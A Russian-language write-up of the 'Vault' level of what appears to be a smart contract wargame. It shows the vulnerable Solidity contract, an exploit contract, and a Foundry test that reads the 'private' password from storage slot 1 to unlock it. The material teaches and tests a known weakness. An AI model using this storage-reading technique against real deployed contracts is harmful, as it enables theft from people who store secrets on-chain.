# 8. Vault
Контракт представляет из себя хранилище, пароль от которого предоставляется в конструкторе и хранится в приватном поле `password`, а значение `locked` устанавливается на `true`
Чтобы пройти уровень, требуется выполнить функцию `unlock(bytes32 password)`, которое проверяет переданный пароль с паролем в хранилище и если пароли совпадают, устанавливает значение `locked` на `false`.

Модификатор видимости `private` не позволяет видеть переменную при вызове контракта, но это не мешает нам по номеру слота посмотреть эту переменную.
Помимо того, можно отследить первую транзакцию, или транзакцию в котором происходит вызов функции с установкой приватной переменной и извлечь оттуда значение.

Код контракта `Vault.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

Код эксплойта `VaultExploit.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IVault {
    function unlock(bytes32 _password) external;
}

contract VaultExploit {
    IVault public vault;
    
    constructor(address _vaultAddress) {
        vault = IVault(_vaultAddress);
    }

    function exploit(bytes32 password) external {
        vault.unlock(password);
    }
}
```

Код теста эксплойта `VaultExploit.t.sol`:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Vault} from "src/Vault/Vault.sol";
import {VaultExploit} from "src/Vault/VaultExploit.sol";

contract VaultExploitTest is Test {
    Vault public vault;
    VaultExploit public vaultExploit;

    function setUp() public {
        vault = new Vault(bytes32(vm.randomUint()));
        vaultExploit = new VaultExploit(address(vault));
    }

    function test_Exploit() public {
        bool oldLocked = vault.locked();
        bytes32 password = vm.load(address(vault), bytes32(uint256(1))); // slot0: locked; slot1: password
        vaultExploit.exploit(password);
        bool newLocked = vault.locked();

        assertEq(oldLocked, true);
        assertEq(newLocked, false);
    }
}
```
